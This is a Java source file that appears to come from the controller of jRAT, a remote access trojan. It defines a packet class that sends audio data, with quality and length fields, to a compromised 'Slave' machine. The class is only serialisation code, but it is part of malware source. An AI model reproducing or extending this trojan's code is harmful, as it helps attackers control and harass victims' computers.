package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet83ServerUploadSound extends AbstractOutgoingPacket {

	private byte[] data;
	private int read;
	private int quality;
	
	public Packet83ServerUploadSound(byte[] data, int read, int quality) {
		this.data = data;
		this.read = read;
		this.quality = quality;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(quality);
		dos.writeInt(read);
		dos.write(data);
	}

	@Override
	public short getPacketId() {
		return 83;
	}

}
